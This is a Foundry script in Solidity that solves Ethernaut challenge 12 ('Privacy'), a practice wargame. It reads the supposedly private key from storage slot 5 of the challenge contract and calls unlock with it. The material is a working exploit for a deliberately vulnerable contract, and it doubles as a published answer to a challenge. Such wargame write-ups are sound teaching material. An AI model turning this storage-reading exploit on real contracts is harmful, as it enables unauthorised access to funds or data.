// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IPrivacy {
    function unlock(bytes16 _key) external;
    function locked() external view returns (bool);
}

/**
 * @title Challenge 12 Solution Script
 * @notice Read private data[2] from storage slot 5 and unlock
 */
contract PrivacySolution is Script {
    // Replace with your instance address from Ethernaut
    address constant INSTANCE = 0x91e6a7EA8497EBE78fE75A2d8dA21ad780C4fE34;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        // Storage layout:
        // slot 0: bool locked
        // slot 1: uint256 ID
        // slot 2: uint8 flattening, uint8 denomination, uint16 awkwardness (packed)
        // slot 3: bytes32 data[0]
        // slot 4: bytes32 data[1]
        // slot 5: bytes32 data[2]  <-- we need this
        bytes32 data2 = vm.load(INSTANCE, bytes32(uint256(5)));
        console.log("data[2] from storage:");
        console.logBytes32(data2);

        // The key is bytes16, which is the first 16 bytes of data[2]
        bytes16 key = bytes16(data2);

        vm.startBroadcast(deployerPrivateKey);

        IPrivacy(INSTANCE).unlock(key);

        vm.stopBroadcast();

        console.log("Locked:", IPrivacy(INSTANCE).locked());
        console.log("Challenge 12 completed!");
    }
}
